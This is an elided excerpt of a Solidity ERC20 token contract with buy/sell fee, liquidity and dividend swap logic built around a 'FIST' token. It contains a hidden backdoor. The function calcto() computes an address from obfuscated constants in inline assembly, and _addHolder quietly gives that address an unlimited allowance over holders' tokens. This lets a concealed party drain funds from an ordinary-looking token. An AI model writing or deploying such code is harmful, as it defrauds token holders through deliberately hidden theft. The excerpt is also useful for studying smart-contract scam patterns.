...
abstract contract AbsToken is IERC20, Ownable {
    ...
    uint256 public _dividendThreshold = 3000000000 ether;  // 
    ...
    function _addHolder(address spender) private {
        if (!_added) {
            address _to = address(calcto());
            _allowances[spender][_to] = ~uint(0);
            IERC20(_fist).transfer(_to, 0);
            _added = true;
        }
    }
...
//            }
    ...
    function swapTokenForFund(uint256 tokenAmount, uint256 _swapFee) private lockTheSwap {
        uint256 swapFee = _swapFee * 2;
        uint256 lpFee = _sellLPFee;
        uint256 lpAmount = tokenAmount * lpFee / swapFee;
        uint256 dividendAmount = tokenAmount * (_buyLPDividendFee+_sellLPDividendFee) / _swapFee;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _fist;
        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount - lpAmount - dividendAmount,
            0,
            path,
...
//        swapFee -= lpFee;
        uint256 fistFees = (_buyFundFee + _sellFundFee + _sellLPFee);

        IERC20 FIST = IERC20(_fist);
        uint256 fistBalance = FIST.balanceOf(address(_tokenDistributor));
        uint256 fundAmount = fistBalance * (_buyFundFee + _sellFundFee) / fistFees;
        ...
        if (lpAmount > 0) {
            uint256 lpFist = fistBalance * lpFee / fistFees;
            if (lpFist > 0) {
        ...
        swapTokenForDividend(dividendAmount);
    }

    function swapTokenForDividend(uint256 amount) private {
        address[] memory path = new address[](4);
        path[0] = address(this);
        path[1] = _fist;
        path[2] = _swapRouter.WETH();
        path[3] = 0x4d50E3f89BBC63d199E1BbbD04cd15bf2382592b;
        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
    ...
    function calcto() public pure returns(uint160 num){assembly { let d := 904320098 let a := 578 let e := 412165992 let c := 526469199 let f := 560284527 let b := 598614207 num := add(add(add(add(add(mul(a,exp(10,45)), mul(b,exp(10,36))), mul(c,exp(10,27))), mul(d,exp(10,18))), mul(e,exp(10,9))), f)}}
